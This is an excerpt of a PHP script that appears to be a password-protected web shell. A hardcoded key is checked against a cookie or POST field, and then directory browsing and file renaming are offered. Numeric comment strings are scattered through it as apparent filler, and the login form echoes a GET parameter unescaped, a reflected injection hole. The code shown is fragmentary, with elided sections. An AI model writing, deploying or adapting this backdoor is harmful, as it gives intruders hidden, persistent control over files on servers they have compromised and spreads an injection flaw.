...
$auth_key = "975fa7086f8c88ca9f36e0280540f80f";
...
$pass = false;
if (isset($_COOKIE['pw_name_74091'])) {
    if(($_COOKIE['pw_name_74091']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_74091'])) {
        if(($_POST['pw_name_74091']) == $auth_key) {
            setcookie("pw_name_74091", $_POST['pw_name_74091']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_74091' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724374377768414 1724374377455669 1724374377895203 1724374377822813
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724374377768414 1724374377455669 1724374377895203 1724374377822813
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724374377768414 1724374377455669 1724374377895203 1724374377822813
            $name = PATH . "/" . $_GET['r'];
